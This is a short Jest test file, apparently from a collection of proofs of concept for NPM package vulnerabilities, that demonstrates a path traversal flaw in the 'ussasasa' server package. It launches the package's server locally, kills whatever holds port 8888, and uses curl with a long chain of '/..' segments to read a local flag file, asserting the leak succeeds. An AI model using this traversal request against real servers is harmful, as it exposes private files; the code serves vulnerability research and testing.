//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/ussasasa/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in ussasasa", (done) => {
  const fs = require("fs");
  const sleep = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");

  try{
    a.execSync('fuser -k 8888/tcp',()=>{})//killing any other process using the same port
  }catch(e){}
  
  let server = "node ./node_modules/ussasasa/index.js"; //to start the server
  exec(server, (error, stdout) => {}); //starting the server

  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    //attack
    expect(stdout).toBe(hostsFile);
    done();
  });
});
